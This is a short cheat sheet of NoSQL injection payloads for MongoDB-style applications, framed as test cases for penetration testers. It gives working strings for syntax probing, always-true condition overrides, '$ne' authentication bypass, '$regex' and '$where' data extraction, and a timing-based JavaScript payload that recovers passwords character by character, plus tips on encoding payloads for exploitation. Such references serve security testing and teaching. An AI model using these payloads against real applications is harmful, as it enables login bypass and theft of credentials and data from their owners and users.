# NoSQL injection

#### Syntax Injection Test Cases:

1. **Testing Query Syntax**:
   * Submit fuzz strings and special characters to test query syntax.
   * Example Payload: `'"{;$Foo}$Foo \xYZ`
2. **Determining Processed Characters**:
   * Inject individual characters to identify syntax interpretation.
   * Example Payload: `'`
3. **Confirming Conditional Behavior**:
   * Test false and true conditions to observe differences in application behavior.
   * Example Payloads:
     * False Condition: `' && 0 && 'x`
     * True Condition: `' && 1 && 'x`
4. **Overriding Conditions**:
   * Inject conditions that always evaluate to true to exploit vulnerabilities.
   * Example Payload: `'%27%7c%7c%31%7c%7c%27`

#### Operator Injection Test Cases:

1. **Submitting Query Operators**:
   * Insert query operators via JSON messages or URL parameters.
   *   Example Payload:&#x20;

       `{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}`
2. **Extracting Data Using Operators**:
   * Utilize query operators to manipulate queries and extract data.
   *   Example Payload:&#x20;

       `{"username":"admin","password":{"$regex":"^.*"}}`
3. **Testing Field Names**:
   * Identify valid fields in the collection to extract data.
   * Example Payloads:
     * Existing Field: `admin' && this.username!='`
     * Non-existent Field: `admin' && this.foo!='`
4. **Injecting Operators for JavaScript Execution**:
   * Use injected operators to execute JavaScript and extract data.
   * Example Payload: `"$where":"Object.keys(this)[0].match('^.{0}a.*')"`
5. **Timing-Based Injection**:
   * Trigger time delays to detect and exploit vulnerabilities.
   *   Example Payload:&#x20;

       `admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'`

#### General Guidelines:

* **Adaptation**: Customize payloads based on specific application contexts.
* **Encoding**: Encode payloads as necessary, particularly for URL-based injections.
* **Validation**: Verify responses for changes/error messages indicating successful exploitation.
